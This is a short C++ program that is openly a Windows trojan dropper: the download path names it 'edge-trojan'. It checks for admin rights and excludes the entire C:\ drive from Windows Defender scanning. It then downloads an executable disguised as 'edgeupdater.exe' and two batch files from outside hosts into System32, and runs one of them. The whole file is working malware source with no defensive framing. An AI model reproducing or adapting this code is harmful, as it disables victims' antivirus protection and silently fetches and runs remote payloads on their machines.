/* Copyright (c) 2022 Phoenixthrush UwU */

/*
* This Source Code Form is subject to the terms of the Mozilla Public
* License, v. 2.0. If a copy of the MPL was not distributed with this
* file, You can obtain one at https://mozilla.org/MPL/2.0/.
*/

#include <iostream>
#include <string>
#include <stdlib.h>
#include <fstream>
#include <Windows.h>
#pragma comment(lib, "urlmon.lib")

using namespace std;

void download();
void access();

int main() {
	cout << "hentai\n" << std::endl;
	access();
	system("powershell -c \"Add-MpPreference -ExclusionPath \\\"C:\\\\\"\"");
	download();
	system("C:\\Windows\\System32\\create.bat");
	return 0;
}

void download() {
	system("powershell -c \"Remove-Item C:\\Windows\\System32\\edgeupdater.exe -Force -ErrorAction SilentlyContinue\"");
   	string dwnld_URL = "https://github.com/phoenixthrush/edge-trojan/releases/download/1.0/main.exe";
    string savepath = "C:\\Windows\\System32\\edgeupdater.exe";
    URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);

	system("powershell -c \"Remove-Item C:\\Windows\\System32\\create.bat -Force -ErrorAction SilentlyContinue\"");
   	string dwnld_URL1 = "https://phoenixthrush.com/edge-trojan/create.bat";
    string savepath1 = "C:\\Windows\\System32\\create.bat";
    URLDownloadToFile(NULL, dwnld_URL1.c_str(), savepath1.c_str(), 0, NULL);

	system("powershell -c \"Remove-Item C:\\Windows\\System32\\edgeupdate.bat -Force -ErrorAction SilentlyContinue\"");
   	string dwnld_URL2 = "https://phoenixthrush.com/edge-trojan/edgeupdate.bat";
    string savepath2 = "C:\\Windows\\System32\\edgeupdate.bat";
    URLDownloadToFile(NULL, dwnld_URL2.c_str(), savepath2.c_str(), 0, NULL);
}

void access() {
	ofstream ofs("C:\\Windows\\System32\\version_test_installer");

	if(ofs.is_open()) {}
	else {
        cout << "access denied" << endl;
		cout << "please relaunch it with admin rights!" << endl;
		cout << "\npress enter to exit!" << endl;
		system("pause >nul");
		abort();
	}
}
